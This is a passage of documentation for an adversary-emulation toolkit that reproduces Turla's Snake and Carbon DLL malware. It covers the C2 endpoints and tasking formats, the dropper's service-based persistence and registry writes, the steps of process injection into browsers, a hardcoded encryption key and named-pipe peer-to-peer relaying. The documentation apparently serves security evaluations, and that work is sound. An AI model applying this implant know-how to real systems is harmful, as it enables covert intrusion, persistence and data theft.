Otherwise, {identifier} is treated as the implant ID, and the server will use this value to determine if a new session is established or if an existing implant is checking in for additional tasking.","POST /IMAGES/3/{instruction_id} for submitting command output, implant logs, or a generic file upload for the instruction identified by {instruction_id}. The C2 server will determine if the instruction ID is for an assigned file upload - if so, the received data is stored under the same filename on the C2 server. If the instruction ID is not linked to an assigned file upload, the C2 server checks if it's one of the hardcoded log file IDs, in which case it accepts the upload as the associated log file. Otherwise, the C2 server assumes that the upload contains command output for the instruction. In this case, the C2 server will log the received command output if the instruction ID is mapped to an implant ID. On successful upload, the server will respond with 1. Note that when accepting log fiel uploads, the server will decode and decrypt each log line before writing the destination file on the server-side.","Regular C2 logs will be uploaded to /IMAGES/3/62810421015953103444 and saved under files/C2Log.YYYY-MM-DD-HH-MM-SS.log, where the timestamp represents the time the log was received. This prevents multiple log file uploads from overwring previous ones.","Execution logs will be uploaded to /IMAGES/3/23329841273669992682 and saved under files/ExecutionLog.YYYY-MM-DD-HH-MM-SS.log","Pipe server logs will be uploaded to /IMAGES/3/59463656487865612747 and saved under files/PipeServerLog.YYYY-MM-DD-HH-MM-SS.log","Pipe client logs will be uploaded to /IMAGES/3/16488587954892310865 and saved under files/PipeClientLog.YYYY-MM-DD-HH-MM-SS.log","GET /IMAGES/3/{instruction_id} to retrieve the payload associated with the given instruction ID. If no instruction with the ID is found, the C2 server will respond with an internal server error message. Note that the implant must be tasked with a payload download instruction before requesting the payload."]},{"l":"Encryption","p":["Turla has used XOR encryption for C2 communications with Snake 1, and we use a different XOR key:","The C2 handler uses XOR encryption in the following scenarios:","encrypting beacon responses containing tasking","encrypting payloads sent to implant","decrypting command output received from implant","decrypting log files and other file uploads received from implant"]},{"l":"Usage"},{"l":"Configuration","p":["To enable and configure the Snake HTTP handler within the control server, edit the config/handler_config.yml from the main C2 server repo. Adjust the Snake HTTP entry as needed.","Example:","Run the controlServer binary as sudo and look for success messages in starting up the Snake handler:"]},{"l":"Tasking Implants","p":["{type: 1, command: ...} or {type: 1, command: ..., runas:domain\\user}- the command type code 01 will have the implant execute a cmd.exe command with the provided args. Note that a command is required for task type 1. The implant will send the command output to the C2 server. If a username is provided via the runas key, the command process will be created under that user if possible.","{type: 2, command: ...}- the command type code 02 will have the implant execute a powershell.exe command with the provided args. Note that a command is required for task type 2. The command will be encoded to UTF-16LE and then base64 encoded so that the implant can run it via powershell.exe -nol -noni -nop -enc . The implant will send output to the C2 server afterwards. If a username is provided via the runas key, the command process will be created under that user if possible.","{type: 3, proc: path_to_binary_to_execute} or {type: 3, proc: path_to_binary_to_execute, args: arg1 arg2 ... argN}- the task type code 3 will instruct the implant to execute the binary at the provided path and with the provided args, if any args are provided. The implant will send output to the C2 server afterwards. If a username is provided via the runas key, the command process will be created under that user if possible.","{type: 4, file: payload_to_download, dest: dest_path_on_victim}- the task type 4 will have the implant request a file download from the C2 server for payload_to_download, and the file will be saved as dest_path_on_victim, or the snake home directory if only a file name is specified. To have the file downloaded to the current directory, use the .\\ path prefix (e.g. .\\filename).","{type: 5, file: path_to_file_to_upload}- the task type 05 will request the implant to upload a local file from the target machine, specified by path_to_file_to_upload","{type: 6}- the task type 6 will request the implant to upload its logs.","args- for the process execution type code ( 3), this represents the arguments to execute the process with (e.g. /all for whoami.exe)","As with other C2 handlers, implant tasking is performed by sending requests to the internal REST server using the evalsC2client.py script. The Snake HTTP handler will allow operators to task the following command types using a JSON dict payload format.","Below are examples of each type code:","command- for type codes dealing with cmd.exe or powershell execution, this string represents the command to run. For example, whoami /all or get-childitem .","dest- for the payload download type code ( 4), this represents the destination file path to save the payload.","Examples of invalid tasking:","Examples of valid tasking:","file- for the payload download type code ( 4), this represents the filename to request from the C2 server. For the file upload task code ( 5), this represents the file path of the local file to upload.","For example:","proc- for the process execution type code ( 3), this represents the binary name/path to execute (e.g. whoami.exe)","runas- for process or command execution tasks, this represents the user to create the process under (e.g. mydomain\\dummyuser)","The JSON dict can contain the following fields:","To register or receive tasking for an implant session, the Snake HTTP handler expects a GET request for /PUB/{identifier}, where {identifier} is the implant ID. If this is the first time that the Snake HTTP handler recognizes the implant with id {identifier}, then it will set up a new session within the internal C2 REST server and then begin tasking the implant upon subsequent GET requests to the same endpoint.","type- command type code that specifies the type of command to send (e.g. execute a process, download a file, upload a file). Must be an integer"]},{"l":"Decrypting Logs","p":["If you need to decrypt Snake log files and you don't have a responding or live implant, you can transfer the log files from the victim machine to the C2 server machine and use the decrypt_logs.py utility in this folder:"]},{"l":"CTI References","p":["https://artemonsecurity.com/snake_whitepaper.pdf"]}],[{"l":"Carbon DLL"},{"l":"Overview","p":["Carbon DLL is a second-stage malware that Turla has used in operations 1. Carbon DLL is implemented as 2 usermodule DLLs and is executed via a service binary, acting as a usermode-only variant of the Carbon rootkit and using asymmetric encryption for C2 traffic via HTTP requests. 1, 2."]},{"l":"Components","p":["The Carbon DLL resources in this repository include the following components 1, 3:","Carbon DLL dropper/installer, which drops the components and configuration file and creates and starts the loader service","Carbon orchestrator DLL, which executes tasks and injects the communications DLL into a browser process","Carbon communications DLL, which communicates with the C2 server and relays tasks to the orchestrator DLL","Loader DLL that is executed as a service in order to kick off the orchestrator DLL."]},{"i":"dropperinstaller","l":"Dropper/Installer","p":["%programfiles%\\Windows NT\\0511 for tasking info","%programfiles%\\Windows NT\\2028 for task output","%programfiles%\\Windows NT\\Nlts for task config files","After successful file writes, the dropper will create a service to execute the loader DLL. 3","Bin path: C:\\Windows\\System32\\svchost.exe -k WinSysRestoreGroup(svchost is used since we are running a DLL as a service).","C:\\Program Files\\Windows NT is set as the Carbon working directory. Per CTI, Carbon randomly selects a folder from C:\\Program Files 1, but we only use Windows NT in the emulated version to maintain consistent evaluations.","Communications library DLL to %programfiles%\\Windows NT\\MSXHLP.dll","Configuration file to %programfiles%\\Windows NT\\setuplst.xml","Display name: WinSys Restore Service","Loader DLL to %systemroot%\\System32\\mressvc.dll","Once the service is set up, the dropper will start it before terminating its own execution.","Orchestrator DLL to %programfiles%\\Windows NT\\MSSVCCFG.dll","Service Name: WinResSvc","The Carbon DLL dropper will create the following subdirectories in the Carbon working directory:","The Carbon DLL dropper will drop the following files to disk 1, 3:","The dropper then performs two registry writes to make sure that the service can find the loader DLL and that the service will run under svchost:","The loader DLL path (%systemroot%\\system32\\mressvc.dll) is written to registry key HKLM:\\SYSTEM\\CurrentControlSet\\services\\WinResSvc\\Parameters under the ServiceDll value","The service details are as follows:","The service name ( WinResSvc) is written to registry key HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost under the WinSysRestoreGroup value","Turla has used the same display name in the past, though we changed the service name to avoid using the exact same naming convention."]},{"l":"Loader DLL","p":["The loader DLL is dropped by the Carbon DLL dropper and then executed via service under svchost. The loader DLL exports a ServiceMain function in order to be run as a service.","When running as a service, the loader DLL will execute the orchestrator DLL by calling its exported CompCreate function, analogous to how Turla executed Carbon DLL with a different exported function name. 3. Note that the loader DLL grabs the orchestrator DLL from disk."]},{"l":"Communications DLL","p":["The Carbon communications library DLL is injected into browser processes by the Orchestrator DLL. Its primary role is to communicate with the C2 server as an HTTP client, or via named pipes if running in peer-to-peer mode, to retrieve tasking information and relay it to the Orchestrator DLL for execution.","For more details on how the comms lib DLL functions and interacts with other Carbon DLL artifacts, please refer to the Comms Lib DLL README file."]},{"l":"Orchestrator DLL","p":["The Carbon DLL Orchestrator is run by the Carbon DLL loader service in order to inject the C2 communication DLL (comms lib) into a legitimate process and execute tasks that the comms lib receives from the C2 server. 1","For more details on how the Orchestrator DLL functions and interacts with other Carbon DLL artifacts, please refer to the Orchestrator DLL README file."]},{"l":"Carbon DLL Directory Structure","p":[".\\0511",".\\0511\\workdict.xml",".\\2028",".\\2028\\dsntport.dat",".\\2028\\traverse.gif",".\\bootinfo.dat",".\\history.jpg",".\\MSSVCCFG.DLL",".\\MSXHLP.DLL",".\\Nlts",".\\setuplst.xml","comms lib dll","comms lib log file","Description","directory for log and task result files","directory for task config files","directory for tasks and task info","File/Folder","For more information on the configuration file and its fields, please see the configuration file section in the Orchestrator README file.","In addition to using different names, the emulated file structure differs from CTI by using only one task file rather than separate ones for both the orchestrator and comms lib DLLs, since only the orchestrator executes tasks in the emulated variant.","list of task result files to send to c2","main Carbon config file","orchestrator dll","orchestrator error log","orchestrator log file","orchestrator tasks","The file structure used by the emulated Carbon DLL is based on a combination of Carbon 3.7X Carbon 3.8X file structures. 1","The table below lists the files and folders in the Carbon DLL working direcotry. In a successful installation, the files and folders listed below will always be created; however, specific task-related files will have varying names based on the corresponding task ID."]},{"l":"Usage","p":["To install Carbon DLL, simply run the installer executable as an administrator.","Instructions on how to task Carbon DLL can be found in the Carbon DLL C2 handler README file.","For more specific usage information for individual components, please refer to their respective README files."]},{"l":"Troubleshooting","p":["If the installer returns an error in its output, the error code will either be a Windows system error code or a custom error code defined in CarbonInstaller/Dropper/include/file_handler.h or CarbonInstaller/Dropper/include/service_handler.h.","To check if files were dropped, you can open up file explorer on the target host and look in C:\\Program Files\\Windows NT","To check if the service is created and running, open up task manager, go to the services tab, and then look for the WinResSvc service.","If the service does not exist or is not running, you may need to check privileges or cleanup and try again.","If the WinResSvc is stopped, or if it's running and you still don't have a Carbon beacon even with Edge open, you can check for the Carbon Orchestrator log and error files at C:\\Program Files\\Windows NT\\history.jpg and C:\\Program Files\\Windows NT\\bootinfo.dat, respectively.","These log files can be decrypted on a Windows machine using the Orchestrator/bin/castDecrypt.exe utility.","The bootinfo.dat error file will likely explain why injection into Edge failed, or if the orchestrator failed in an earlier spot.","If neither file exists, it's likely the service was unable to start, and you will likely need to perform cleanup and try executing the installer again.","If you're still having issues obtaining an initial beacon despite successful injection, or if you obtained a beacon and then lost communication from the Carbon implant, look for the C:\\Program Files\\Windows NT\\2028\\dsntport.dat communications module log file.","This log file can be decrypted on a Linux machine using the CommLib/decrypt_logs.py utility:","If this file does not exist, then that means the communications library was either not injected or was not even able to start up.","Once decrypted, you can look through the log for indicators of problems, such as pipe communication issues for peer-to-peer.","Error codes in the log file will either be a Windows system error code or a custom error code defined in header files within the CommLib/include directory."]},{"l":"Cleanup","p":["To remove artifacts, run the Carbon cleanup Powershell Script as an administrator on the target host(s).","You can do so from a domain controller using the following powershell command (from a directory containing the script):","For example, to cleanup the Carbon Scenario from evaluations:","From the Kali Linux machine ( 176.59.15.33):","From the domain controller RDP session, open an Admin PowerShell and execute the cleanup script:","Sign out of the RDP session when finished."]},{"l":"Build","p":["For specific build instructions, refer to the README files for each individual component."]},{"l":"Testing","p":["For specific test instructions, refer to the README files for each individual component."]},{"l":"References and CTI","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]}],[{"l":"Carbon DLL Installer"},{"l":"Usage","p":["To run the installer, simply run the dropper.exe executable (release builds located in bin/) as an administrator."]},{"l":"Component Breakdown"},{"l":"Dropper","p":["%programfiles%\\Windows NT\\0511 for tasking info","%programfiles%\\Windows NT\\2028 for task output","%programfiles%\\Windows NT\\Nlts for task config files","After successful file writes, the dropper will create a service to execute the loader DLL. 3","Bin path: C:\\Windows\\System32\\svchost.exe -k WinSysRestoreGroup(svchost is used since we are running a DLL as a service).","Communications library DLL to %programfiles%\\Windows NT\\MSXHLP.dll","Configuration file to %programfiles%\\Windows NT\\setuplst.xml","Display name: WinSys Restore Service","Loader DLL to %systemroot%\\System32\\mressvc.dll","Once the service is set up, the dropper will start it before terminating its own execution.","Orchestrator DLL to %programfiles%\\Windows NT\\MSSVCCFG.dll","Service Name: WinResSvc","The Carbon DLL dropper will create the following subdirectories in the Carbon working directory:","The Carbon DLL dropper will drop the following files to disk 1, 3:","The dropper then performs two registry writes to make sure that the service can find the loader DLL and that the service will run under svchost:","The loader DLL path (%systemroot%\\system32\\mressvc.dll) is written to registry key HKLM:\\SYSTEM\\CurrentControlSet\\services\\WinResSvc\\Parameters under the ServiceDll value","The service details are as follows:","The service name ( WinResSvc) is written to registry key HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost under the WinSysRestoreGroup value","Turla has used the same display name in the past, though we changed the service name to avoid using the exact same naming convention."]},{"l":"Dropper Build Instructions","p":["Since the Carbon DLL dropper contains the various implant components (config file and DLLs), you will need to add those components in as resources at compile-time. Use the add_resources.py script to auto-generate the src/components.cpp file that contains each of the latest resource components. Supply the appropriate file paths to the latest version of each resource that you want to include.","Note that PyCryptoDome is required. You can installed it with the following command:","To generate the src/components.cpp file:","The encryption key used for adding resources is f2d4560891bd948692c28d2a9391e7d9, which was generated by using PBKDF2 with 5 iterations of SHA1, passphrase of checkmatepepper and salt of salty, resulting in a 128-bit key. Example using CyberChef)","Now that you have all of the resources in src/components.cpp, you can build the dropper executable.","The dropper executable was built on Kali Linux using the following build command from the Dropper directory:","To remove symbols, you can use the strip command:","To verify, you can run strings or objdump --syms bin/dropper.exe- you should see an empty symbols table."]},{"l":"Loader DLL","p":["The loader DLL is one of the components dropped by the Carbon DLL dropper. The dropper will then create a service to run the loader DLL under svchost, which requires some registry key creation and modification. The loader DLL exports a ServiceMain function in order to be run as a service.","When running as a service, the loader DLL will execute the orchestrator DLL by calling its exported CompCreate function. 3"]},{"l":"Loader DLL Build Instructions","p":["The loader DLL executable was built on Kali Linux using the following build command from the Loader directory:","To remove symbols, you can use the strip command:","To verify, you can run strings or objdump --syms bin/loader.dll- you should see an empty symbols table."]},{"l":"Cleanup","p":["To remove artifacts, run the Resources/cleanup/Carbon/carbon_cleanup.ps1 Powershell Script as an administrator on the target host(s).","You can do so from a domain controller using the following powershell command (from a directory containing the script):"]},{"l":"Troubleshooting","p":["If the installer returns an error in its output, the error code will either be a Windows system error code or a custom error code defined in Dropper/include/file_handler.h or Dropper/include/service_handler.h.","To check if files were dropped, you can open up file explorer on the target host and look in C:\\Program Files\\Windows NT","To check if the service is created and running, open up task manager, go to the services tab, and then look for the WinResSvc service.","If the service does not exist or is not running, you may need to check privileges or cleanup and try again.","If the WinResSvc is stopped, or if it's running and you still don't have a Carbon beacon even with Edge open, you can check for the Carbon Orchestrator log and error files at C:\\Program Files\\Windows NT\\history.jpg and C:\\Program Files\\Windows NT\\bootinfo.dat, respectively.","These log files can be decrypted on a Windows machine using the Resources/Carbon/Orchestrator/bin/castDecrypt.exe utility.","The bootinfo.dat error file will likely explain why injection into Edge failed, or if the orchestrator failed in an earlier spot.","If neither file exists, it's likely the service was unable to start, and you will likely need to perform cleanup and try executing the installer again.","If you're still having issues obtaining an initial beacon, or if you obtained a beacon and then lost communication from the Carbon implant, look for the C:\\Program Files\\Windows NT\\2028\\dsntport.dat communications library log file.","This log file can be decrypted on a Linux machine using the Resources/Carbon/CommLib/decrypt_logs.py utility:","If this file does not exist, then that means the communications library was either not injected or was not even able to start up.","Once decrypted, you can look through the log for indicators of problems, such as pipe communication issues for peer-to-peer."]},{"l":"Installer Build Commands for the Scenario","p":["Optional: rebuild the Loader DLL (run from the Loader directory:","To compile the installer, run the following from a Linux machine from the Dropper directory:"]},{"l":"Unit Tests","p":["(OPTIONAL) If running CMake via Visual Studio Code:","Add C:\\tools\\msys64 to your PATH enviromment variable to run msys2. Reopen console windows to register the new env variable.","C:\\Program Files\\CMake\\bin or equivalent CMake bin folder","C:\\tools\\msys64\\mingw64\\bin or equivalent Mingw-w64 bin folder","C/C++","choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System'","choco install msys2","CMake","CMake Tools","CMake: CMake Path","CMake: Generator","Configure CMake settings in VS Code:","Ensure the following paths are set in the SYSTEM environment PATH variable (note that these may differ in your environment depending on how you installed CMake and mingw64).","If cmake was already installed but is not in your path, add it to your path manually (e.g. C:\\Program Files\\CMake\\bin)","In Command Palette, run CMake: Run Tests","Make sure CMake is installed on your machine","Make sure mingw64 is installed on your machine. In this particular example, msys2 was installed and used to install mingw64.","Make sure you have the following VS Code extensions:","Open the corresponding project folder in VS Code ( Dropper or Loader)","pacman -S --needed base-devel mingw-w64-x86_64-toolchain","pacman -Syu","Paths to folders containing gcc and g++ compilers if not already included in the above Mingw-w64 path folder.","Reopen console windows to register the new env variables.","Run msys2 and within the new prompt, run the following:","Set to \"MinGW Makefiles\" (no quotes)","Set to wherever the cmake executable is located","Set up and run tests via Powershell from the directory of the component to check (e.g. Dropper or Loader):","Unit tests were run on a Windows machine using CMake. Each component subfolder has its own unit test setup.","You will need to restart the shell to use cmake."]},{"l":"CTI References","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]}],[{"l":"Carbon-DLL Orchestrator DLL"},{"l":"Orchestrator"},{"l":"Overview","p":["The Carbon DLL Orchestrator (orch) will be started from the Carbon installer service and inject the C2 communication DLL (comms lib) into a legitimate process. 1 The orchestrator will create mutexes for the comms lib and itself to manage file access. 1 The orchestrator will monitor a specific file to find tasks that the comms lib pulled from the C2. 1 The orchestrator will publish its completed tasks and relevant information to another file that the comms lib monitors so that the information can be sent back to the C2. 1"]},{"l":"Files"},{"l":"File Structure and Explanation","p":[".\\0511",".\\0511\\workdict.xml",".\\2028",".\\2028\\dsntport.dat",".\\2028\\traverse.gif",".\\bootinfo.dat",".\\history.jpg",".\\MSSVCCFG.DLL",".\\MSXHLP.DLL",".\\Nlts",".\\setuplst.xml","C:\\Program Files\\Windows NT is set as the Carbon working directory. Per CTI, Carbon randomly selects a folder from C:\\Program Files 1, but we only use Windows NT to maintain consistent evaluations.","comms lib dll","comms lib logging","Description","directory for log and task result files","directory for tasks and task configs","directory to contain task config files","error log","File/Folder","list of files to send to c2","main config file","orchestrator dll","orchestrator tasks","result log","The file structure for Carbon was based on a combination of Carbon 3.7X Carbon 3.8X file structures 1 Our file structure differs from CTI in that we do not have a separate task file for both the orchestrator and the comms lib since only the orchestrator executes tasks. We also excluded the two .png files in the Carbon 3.8X file tree that do not have an explanation of their purpose.","The files and folders listed here will always be created, but task output file names are defined in each line of workdict.xml."]},{"l":"Configuration File","p":["The Carbon installer will drop an encrypted setuplst.xml config file to the working directory that the orchestrator and comms lib will read. Our config file was based off the Carbon 3.77 config file. 1 A plain text version of the config file is available in bin/configPlainText.xml.","These are the different sections, settings, and their descriptions in the config file:| Section | Setting | Description || ------------ | ----------- | ----------- || [NAME] | object_id | The uuid of this implant || [PROC] | net_app | A list of the target applications for the orchestrator to inject into || [CRYPTO] | rsa_priv | The private RSA key for the comms lib to decrypt communications from the C2 || [TIME] | | not used in our implementation || [CW_LOCAL] | quantity | not used in our implementation || [CW_INET] | address1 | The URL of the C2 endpoint || [TRANSPORT] | system_pipe | The name of the pipe used for p2p || ^ | spstatus | not used in our implementation || ^ | adaptable | not used in our implementation || ^ | p2p_client | If this implant will run in p2p client mode or not || ^ | peer_pipe | The pipe to send C2 communications back to || [DHCP] | server | not used in our implementation || [LOG] | logperiod | not used in our implementation || [WORKDATA] | | not used in our implementation || [LOCATION] | task_dir | The name of the directory that contains the task file || ^ | log_dir | The name of the directory that contains task output related files || ^ | t_cfg_dir | The name of the directory that contains task config files || [FILE] | cfg | The name of the main config file || ^ | tsk | The name of the task file || ^ | send | The name of the file that lists files to send to the C2 || ^ | elog | The name of the error log file || ^ | log | The name of the regular log file || [MTX] | cfg | The name of the mutex for the task file || ^ | tsk | The name of the mutex for the task file || ^ | send | The name of the mutex for the file that lists files to send to the C2 || ^ | elog | The name of the mutex for the error log file || ^ | log | The name of the mutex for the regular log file |","Upon startup, the first thing the orchestrator will do is read this config file. If there is an option missing from the config file that the orchestrator is expecting, it will fall back to a default value. These are listed in the src/orchestrator.cpp file."]},{"l":"Functionality"},{"l":"Encryption","p":["source","Each file output from the orchestrator will be encrypted with CAST-128. 1 We used a hardcoded key with a hex value of f2d4560891bd948692c28d2a9391e7d9 in our implementation. The orchestrator expects the config file to be encrypted, and will first decrypt it and load configuration information before performing any action.","The orchestrator also expects task-related files to be encrypted and will decrypt tasking information before proceeding to task execution. Task output is encrypted on disk for the comms lib to pick up and send to the C2 server."]},{"l":"Mutexes","p":["source","The orchestrator will create five mutexes to coordinate file access between the comms lib and itself. The mutexes created were based off Carbon 3.8X. 1 The number of mutexes used here was reduced by two when compared to the CTI because we do not use an equivalent of xmlrts.png, and only the orchestrator is completing tasks, so there is less simultaneous read/write access between the orchestrator and the comms lib.","These are the mutexes created by the orchestrator and their descriptions:| Mutex | Description || ------------ | ----------- || Global\\Microsoft.Telemetry.Configuration | Represent config file setuplst.xml ownership || Global\\DriveEncryptionStd | Represent task file workdict.xml ownership || Global\\DriveHealthOverwatch | Represent send file traverse.gif ownership || Global\\Threading.Management.Info | Represent error log bootinfo.dat ownership || Global\\Stream.Halt.Restoration | Represent regular log history.jpg ownership |"]},{"l":"Injection","p":["source","The orchestrator will inject the 3rd stage communications library into processes that typically generate HTTP traffic, such as a web browser. 1, 2, 3 For our evaluations, only Microsoft Edge was tested with the orchestrator. Injection into other web browsers should be possible, but this is not tested.","Injection is performed in the following steps:","enable debug privileges for the current process source","read the config file for a list of target processes source","look for those processes on the current machine, and record the PIDs of the ones found source","get a handle to KERNEL32.dll from a target process source","perform the injection using GetProcAddress for LoadLibraryA, OpenProcess for the target process, VirtualAllocEx, WriteProcessMemory, and finally CreateRemoteThread source","After successful injection, the comms lib DLL will start to communicate with the C2 server.","The orchestrator uses OpenProcess and WaitForSingleObject to monitor the process that the comms lib was injected into. If that process is terminated, the orchestrator will attempt to find a new host process to re-inject the comms lib."]},{"l":"Tasking","p":["a number designating which task this is","A task config file can exclude the name field, and cmd.exe will be filled in by default. However, an operator should not need to worry about creating the task config files ask this is done automatically by the comms lib, and an operator should refer to the Carbon C2 handler for instructions on how to task the implant. If tasks are found, the orchestrator will parse them, pick out each section of the task, and then execute the task. The orchestrator is able to execute multiple tasks sequentially if there are multiple in the tasking file. Once the orchestrator has completed executing all of the tasks, it will remove them from the tasking file and release the mutex for the tasking file. Then, the orchestrator will take any output and log information from the task it performed, and put those in the task_result_filepath and task_log_filepath respectivley. The orchestrator will then gain ownership of the mutex for and make an entry in the \"files to send to the C2\" file, traverse.gif. The format for these entries is as follows:","Description","exe","Field","filepath","Mutex","name","num_files","Since only sending 1 file per entry is supported, each task will create two entries in traverse.gif, one for the result file and one for the log file. The comms lib will then check traverse.gif for entries, and when found, will send those files to the C2 server.","source","task_config_filepath","task_filepath","task_id","task_log_filepath","task_result_filepath","the arguments to run the file with","The comms lib will post tasks for the orchestrator in workdict.xml. The orchestrator will check workdict.xml for updates every 5 seconds. The format for each task is as follows 1:","The format for a task config file is as follows:","the location of a file that the orchestrator will execute for this task","the location of the configuration file specific to this task","the location where the orchestrator will output its log for this task","the location where the orchestrator will output the task result (i.e. command output)","the name of the file to run (cmd.exe by default)","the number of files to send (only 1 is supported)","the path of the file to send","the uuid of the implant, as defined in the config file","uuid"]},{"l":"Testing Information","p":["After all requisite files are found, output-itest.ps1 will clean the working directory, C:\\Program Files\\Windows NT, of any artifacts. Next, output-itest.ps1 will manually create the directories in C:\\Program Files\\Windows NT that Carbon requires. Then, it will copy over the files from turla\\Resources\\Carbon\\Orchestrator\\resources. Now, it will start Carbon using dllrunner.exe and ./bin/runner.exe to start the comms lib and orchestrator respectivley. Once you are done testing, you can enter 1 in the script to view the log files, where the script will run ./bin/castDecrypt.exe for both history.jpg and bootinfo.dat. Finally, the script will clean up any artifacts created from testing.","Currently, the orchestrator will output everything it logs to console for testing purposes. Using any of the testing scripts will perform process injection","dllrunner.exe: dll runner used to start the comms lib (output-itest.ps1 only)","If the installer does not have the most recent versions of the orchestrator or comms lib, you can test the orchestrator with the included output-itest.ps1 script.","If you encounter an error, ./include/orchestrator.h has a mapping of error code to a basic name of the error to help diagnose the issue.","MSSVCCFG.dll: the orchestrator","MSXHLP.dll: the comms lib","output-itest.ps1 runs the orchestrator and comms lib separately so that the user has console output for both. Both testing scripts require that files are placed in turla\\Resources\\Carbon\\Orchestrator\\resources:","resources/Payloads/DllLoader/dllrunner.exe(resources repo, not turla)","setuplst.xml: the encrypted config","The c2 server seems to want one task at a time. You need to start the c2 before you start carbon.","The easiest way to test the orchestrator is to use the Carbon Installer.","These files can be found in these locations respectively:","turla/Resources/Carbon/CommLib/bin/commlib.dll(needs to be renamed)","turla/Resources/Carbon/Orchestrator/bin/MSSVCCFG.dll","turla/Resources/Carbon/Orchestrator/bin/setuplst.xml","You will need to have a c2 server running and issue a task in order to see that Carbon is working. The following task was used to test that Carbon is working properly: ./evalsC2client.py --set-task SOMEUUID '{id: 1, code: 0, cmd: whoami /all}'. You can change the cmd: whoami /all section to execute another command, such as cmd: systeminfo. Please ensure that the comms lib is looking at the right IP/port for your c2 server. This is defined in the config under address1, which you only need to change the IP and port. If you need to edit the config, you can encrypt it by making your changes to ./bin/configPlainText.xml and running ./bin/configEncrypt.exe. This will overwrite ./bin/setuplst.xml with the updates made to ./bin/configPlainText.xml."]},{"l":"Build Instructions","p":["All PE files were build on Windows 10 with MinGW32. You can use the included build.ps1 script to automatically remove and rebuild the PE files. build.ps1 is designed to build a dll from .\\test\\dllspawnnp.cpp and place it in .\\bin\\MSXHLP.dll so that it can be injected by the orchestrator for testing. However, having the .\\test\\dllspawnnp.cpp file is not required to be able to build using build.ps1, and the script will skip that file if it does not exist. build.ps1 will also remove the symbols from the orchestrator dll and check that they have been removed.","If you wish to build the PE files manually, these are the commands that are used to do so.","You can remove symbols from the orchestrator dll with the following command:","To verify, you can run objdump --syms .\\bin\\MSSVCCFG.dll- you should see an empty symbols table."]},{"l":"Cleanup Instructions","p":["When running the orchestrator with the Carbon Installer, refer to the Carbon Installer's turla/Resources/cleanup/Carbon/carbon_cleanup.ps1 script for cleanup."]},{"l":"CTI References","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.gdatasoftware.com/blog/2015/01/23926-analysis-of-project-cobra","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html"]}],[{"l":"CommLibDLL"},{"l":"Overview","p":["This library will be injected into a Windows process and used to communication with the C2 server. Communication may be direct, or be routed through a different instance of this library on a seperate computer. The messages received from the C2 server are primarily tasks from the C2 server, which are stored in a file for the Carbon Orchestrator to run. This library also checks for task results from the Orchestrator and sends those results to the C2 server."]},{"l":"C2 Communications","p":["The communication library DLL supports two modes of communication with the C2:","direct C2 channel using HTTP","peer-to-peer C2 communication using named pipes"]},{"l":"HTTP Communications","p":["The library module will determine the C2 server address, port, and URL path from the options provided in the config file. A heartbeat request is sent to the C2 addr/url to check that the server is alive. If alive, the module will then use the PHPSESSID cookie in future requests with the appropriate implant ID value to tell the C2 server who the beacon is for.","HTTP GET requests are sent to request tasking, and POST requests are used to send task output.","For tasking, the server will send an HTML response with the base64-encoded encrypted task information placed as the value HTML tag value. The task information will contain payload and command information, which the module will use to do the following:","write the payload to disk at the specific location (if a payload is provided)","build a task config file containing the payload location (if a payload is provided) and the command to run. The task config file will be placed in the C:\\Program Files\\Windows NT\\Nlts\\a67s3ofc[task id].txt filepath. For instance, if the task id is 15, the config file will be placed in C:\\Program Files\\Windows NT\\Nlts\\a67s3ofc15.txt","append the following line to the task list file at C:\\Program Files\\Windows NT\\0511\\workdict.xml:","task_id | payload_path (optional) | task_config_path | task_output_path | task_log_path","example: 12 | C:\\\\users\\\\public\\\\testpayload | C:\\Program Files\\Windows NT\\Nlts\\a67s3ofc15.txt | C:\\Program Files\\Windows NT\\2028\\15.yml | C:\\Program Files\\Windows NT\\2028\\15.log","For task output, the comms lib module will look for available task output info in the task output metadata file (configurable during compilation, currently set to C:\\Program Files\\Windows NT\\2028\\traverse.gif). This file contains lines of the following format:","Example:","The implant will upload the contents of the task output file and clear the task output metadata file."]},{"l":"Named Pipe Peer-to-Peer","p":["To configure named pipe peer-to-peer options, you can adjust the options under the [TRANSPORT] section of the main configuration file:","Currently, spstatus and adaptable are not used and can be ignored.","system_pipe refers to the name of the pipe used on all machines for peer-to-peer comms","p2p_client toggles whether or not the implant will use named-pipe p2p or HTTP comms to reach the C2 server. To enable, set the value to true or yes.","peer_pipe indicates the full pipe address (including hostname and pipename) of the peer to connect to for named pipe p2p communication. Note that this pipe address must align with whatever the system_pipe value is for the configuration file of the peer","If the module is running in HTTP comms mode, it will mark itself as available for p2p requests by listening on the pipe specified in system_pipe. Peers can then connect to this pipe if the address is provided in peer_pipe in their config file. P2p clients will send beacon requests and task output to p2p listeners, who will then relay this information to the C2 server on behalf of the client, returning any server responses such as tasking and payloads. P2p clients will also listen on their own local named pipe (indicated by system_pipe for responses from ther peers.","Note that because no usernames/passwords are explicitly used, any pipe connection will be done under the user context of the process running the comms library DLL module. Thus, operators must make sure that the p2p participants can access each other's named pipes."]},{"l":"Encryption","p":["The comms library module uses CAST-128 encryption with some of its files and C2 communication 1:","CAST-128 encryption is used to encrypt/decrypt certain files on disk:","main implant configuration file C:\\Program Files\\Windows NT\\setuplst.xml","the pending task file for the orchestrator to pick up ( C:\\Program Files\\Windows NT\\0511\\workdict.xml)","associated task configuration files ( C:\\Program Files\\Windows NT\\Nlts\\a67s3ofc[task id].txt)","task output files ( C:\\Program Files\\Windows NT\\2028\\[task id].log)","metadata file containing info on task output to submit to the C2 server ( C:\\Program Files\\Windows NT\\2028\\traverse.gif)","Named pipe peer-to-peer communication between hosts is encrypted using CAST-128 1","The embedded base64 blob in HTML responses from the C2 server contains a 2-part concatenated 